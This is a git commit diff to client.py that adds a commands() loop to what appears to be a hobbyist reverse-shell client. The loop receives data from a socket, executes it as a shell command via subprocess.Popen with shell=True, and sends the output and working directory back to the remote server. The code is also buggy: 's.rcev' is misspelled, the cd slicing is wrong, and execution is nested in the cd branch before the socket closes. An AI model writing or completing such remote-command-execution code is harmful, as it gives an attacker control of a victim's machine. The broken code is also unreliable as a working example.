2b7dbb4ababbf14a9792d44799864bb6e268f29e
RapidTheNerd <george.marr.cobc@gmail.com>
2017-08-16 20:58:29 +0100

    okay that was bad

--- client.py
+++ client.py
@@ -22,4 +22,17 @@ def socketConnect():
     except socket.error as msg:
         print(msg)
 
-        
+
+def commands():
+    global s
+    while True:
+        data = s.rcev(1024)
+        if data[:2].decode("utf-8") == 'cd':
+            os.chdir(data[:3].decode("utf-8"))
+            if len(data) > 0:
+                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                bytes_output = cmd.stdout.read() + cmd.stderr.read()
+                string_out = str(bytes_output, "utf-8")
+                s.send(str.encode(string_out + str(os.getcwd()) + '> '))
+                print(string_out)
+                s.close()
